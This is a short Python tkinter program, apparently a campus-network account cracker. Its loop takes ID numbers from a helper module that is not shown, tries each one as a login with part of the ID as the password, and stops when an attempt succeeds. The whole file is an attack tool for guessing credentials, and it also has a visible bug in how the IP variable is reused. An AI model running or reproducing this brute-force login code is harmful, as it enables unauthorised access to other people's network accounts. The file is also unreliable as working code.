# -*- codeing = utf-8 -*-
# @Time : 2021/9/2 9:48 下午
# @Author : renew
# @File : view_test.py
# @Software : PyCharm

import tkinter as tk
import socket
import idTest

# mac ip
ip = socket.gethostbyname_ex(socket.gethostname())[2][1]
print(ip)


def getip():
    i = 1
    while 1:
        ci = "第" + str(i) + "次"
        ll = 'dr1003({"result":0,"msg":"账号不存在","ret_code":4});'
        id = idTest.idHit()

        info = ci + "账号是：" + id + "密码为：" + id[12:18]
        text.insert(tk.INSERT, info)
        if idTest.netHid(id, ip) == ll:
            pass
        else:
            text.insert(tk.INSERT, "成功")
            exit()
        i = i + 1

# 渲染一个头部
top = tk.Tk()
top.title("校园网pj程序")
top.geometry("400x400+200+50")

ip = tk.Label(top, text=ip)
ip.pack()
button1 = tk.Button(top, text="开始", command=getip, height=4)

button1.pack()
scroll = tk.Scrollbar()
text = tk.Text(top, height=10)
# side放到窗体的哪一侧,  fill填充
scroll.pack(side=tk.RIGHT, fill=tk.Y)
text.pack(side=tk.LEFT, fill=tk.Y)
# 关联
scroll.config(command=text.yview)
text.config(yscrollcommand=scroll.set)

text.pack()

top.mainloop()
